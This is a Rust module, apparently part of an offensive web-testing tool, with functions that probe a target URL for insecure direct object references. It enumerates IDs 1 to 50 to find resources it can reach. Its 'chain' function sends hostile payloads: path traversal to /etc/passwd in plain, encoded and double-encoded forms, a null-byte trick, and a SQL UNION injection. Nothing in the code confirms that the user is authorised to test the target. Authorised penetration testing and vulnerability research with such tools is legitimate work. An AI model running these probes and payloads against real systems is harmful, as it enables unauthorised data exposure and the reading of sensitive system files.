use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none())
        .build()
        .unwrap_or_else(|_| Client::new())
}

pub async fn test(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} IDOR Vulnerability Test", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let id_patterns = [
        ("Numeric ID", "1", "2", "3"),
        (
            "UUID v1",
            "550e8400-e29b-41d4-a716-446655440000",
            "550e8400-e29b-41d4-a716-446655440001",
            "550e8400-e29b-41d4-a716-446655440002",
        ),
        ("Sequential", "100", "101", "102"),
        ("Hex", "0x1a2b", "0x1a2c", "0x1a2d"),
    ];

    for (name, id1, id2, id3) in &id_patterns {
        let urls = [
            format!("{}{}", url, id1),
            format!("{}{}", url, id2),
            format!("{}{}", url, id3),
        ];
        let mut responses = vec![];
        for u in &urls {
            if let Ok(r) = client.get(u).send().await {
                let status = r.status().as_u16();
                let body = r.text().await.unwrap_or_default();
                responses.push((status, body.len()));
            }
        }
        if responses.iter().all(|(s, _)| *s == 200) {
            println!(
                "  {} {:15} — all IDs accessible (potential IDOR)",
                "[!]".red().bold(),
                name
            );
        } else {
            println!("  {} {:15} — mixed responses", "[-]".dimmed(), name);
        }
    }

    Ok(())
}

pub async fn enumerate(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} IDOR Enumeration", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let mut found = 0u32;

    for i in 1..=50 {
        let target = format!("{}{}", url, i);
        if let Ok(r) = client.get(&target).send().await {
            let status = r.status().as_u16();
            let body = r.text().await.unwrap_or_default();
            if status == 200 && !body.is_empty() {
                found += 1;
                if i <= 10 || i % 10 == 0 {
                    println!("  {} ID={} — {} bytes", "[+]".green().bold(), i, body.len());
                }
            }
        }
    }

    println!(
        "\n  {} {} resources accessible out of 50 tested",
        "[*]".cyan().bold(),
        found
    );
    if found > 20 {
        println!(
            "  {} Widespread IDOR — mass data exposure likely",
            "[!]".red().bold()
        );
    }

    Ok(())
}

pub async fn predict(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} IDOR Pattern Prediction", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let mut sizes: Vec<(u16, usize)> = vec![];

    for i in 1..=10 {
        let target = format!("{}{}", url, i);
        if let Ok(r) = client.get(&target).send().await {
            let status = r.status().as_u16();
            let body = r.text().await.unwrap_or_default();
            sizes.push((status, body.len()));
            println!(
                "  {} ID={:2} — status={} size={}",
                "*".cyan(),
                i,
                status,
                body.len()
            );
        }
    }

    if !sizes.is_empty() {
        let avg_size: usize = sizes.iter().map(|(_, s)| s).sum::<usize>() / sizes.len();
        println!(
            "\n  {} Average response size: {} bytes",
            "[*]".cyan().bold(),
            avg_size
        );
        if sizes.iter().all(|(s, _)| *s == 200) {
            println!(
                "  {} All IDs return 200 — predictable pattern confirmed",
                "[!]".red().bold()
            );
        }
    }

    Ok(())
}

pub async fn chain(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} IDOR Chain Attack", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let chain_payloads = [
        ("Path traversal", "../../../etc/passwd"),
        ("Encoded traversal", "..%2F..%2F..%2Fetc%2Fpasswd"),
        ("Double encoded", "%252e%252e%252f%252e%252e%252f"),
        ("Null byte", "1%00.txt"),
        ("Array inject", "1,2,3,4,5"),
        ("Wildcard", "*"),
        ("Range", "1-100"),
        ("SQLi union", "1 UNION SELECT 1--"),
    ];

    for (name, payload) in &chain_payloads {
        let target = format!("{}{}", url, payload);
        match client.get(&target).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                if status == 200 && !text.is_empty() {
                    println!(
                        "  {} {:20} — {} bytes",
                        "[!]".red().bold(),
                        name,
                        text.len()
                    );
                } else {
                    println!("  {} {:20} — status={}", "[-]".dimmed(), name, status);
                }
            }
            Err(_) => println!("  {} {:20} — error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}
